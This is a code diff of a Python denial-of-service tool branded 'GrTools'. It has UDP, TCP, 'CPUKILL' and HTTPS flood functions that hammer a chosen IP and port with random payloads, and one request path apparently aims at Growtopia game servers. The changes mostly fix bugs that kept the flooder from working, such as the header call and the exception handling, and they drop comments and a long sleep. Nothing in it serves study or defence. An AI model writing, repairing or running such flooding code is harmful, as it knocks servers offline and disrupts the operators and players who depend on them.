@@ -8,12 +8,9 @@ import http.client
 import threading
 import os
 import time
-from colorama import Fore
 
-# Tanggal kedaluwarsa (misalnya 7 hari setelah saat ini)
 expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)
 
-# Fungsi untuk memeriksa apakah akun sudah kedaluwarsa
 def is_account_expired():
     current_date = datetime.datetime.now()
     if current_date > expiration_date:
@@ -54,12 +51,10 @@ if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "TLS":
     print("VALID METHOD")
 else:
     print("METHOD INVALID!")
-    time.sleep(200000)
     time.sleep(2000)
 
 referers = ["""Server Got Attacked!"""]
 
-# Nih headers buat method biar tambah seterong aja :p
 def Headers(method):
     header = ""
     if method == "TCP" or method == "UDP" or method == "TLS" or method == "CPUKILL":
@@ -83,10 +78,7 @@ def udpby():
     udpfloodl = os.urandom(10024)
     while datetime.datetime.now() < expiration_date:
         get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
-        request  = get_host + Headers + "\r\n"
-    else:
-        get_host = random.choice(['GET','POST','HEAD']) + " /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
-        request  = get_host + Headers + "\r\n"
+        request  = get_host + Headers(method) + "\r\n"
         try:
             s.sendto(udpfloodl, (ip, port))
             for x in range(times):
@@ -106,18 +98,15 @@ def cpukil():
             for x in range(times):
                     s.sendto(cpu, (ip, port))
             print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method {method} ")
-        except socket.error:
-            print(error)
+        except Exception as e:
+            print(e)
             s.close()
 
 def tcpfl():
     grtools = os.urandom(15419) + random._urandom(10414)
     while datetime.datetime.now() < expiration_date:
         get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
-        request  = get_host + Headers + "\r\n"
-    else:
-        get_host = random.choice(['GET','POST','HEAD']) + " /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
-        request  = get_host + Headers + "\r\n"
+        request  = get_host + Headers(method) + "\r\n"
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
@@ -125,20 +114,18 @@ def tcpfl():
             for x in range(times):
                     sock.send(grtools)
             print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method TCP Flood ")
-        except socket.error:
-                print(error)
+        except Exception as e:
+                print(e)
                 sock.close()
 
 def httpfl():
         while datetime.datetime.now() < expiration_date:
             try:
-                # Membuat koneksi SSL/TLS
                 context = ssl.create_default_context()
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 ssl_sock = context.wrap_socket(sock)
                 ssl_sock.connect((ip, 443))
 
-                # Mengirimkan permintaan HTTP
                 get_host = "GET /growtopia/server_data.php HTTP/1.1\r\nHost: " + ip + "\r\n"
                 http_request = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
 
@@ -146,8 +133,8 @@ def httpfl():
                     ssl_sock.send(http_request)
 
                 print(f"Sending Packet to > ip : {ip} port : 443 | with time => {times} with Method HTTP Flood ")
-            except socket.error:
-                print(f"Error Cant Connecting | ip : {ip} port : 443")
+            except Exception as e:
+                print(e)
             finally:
                 ssl_sock.close()
 
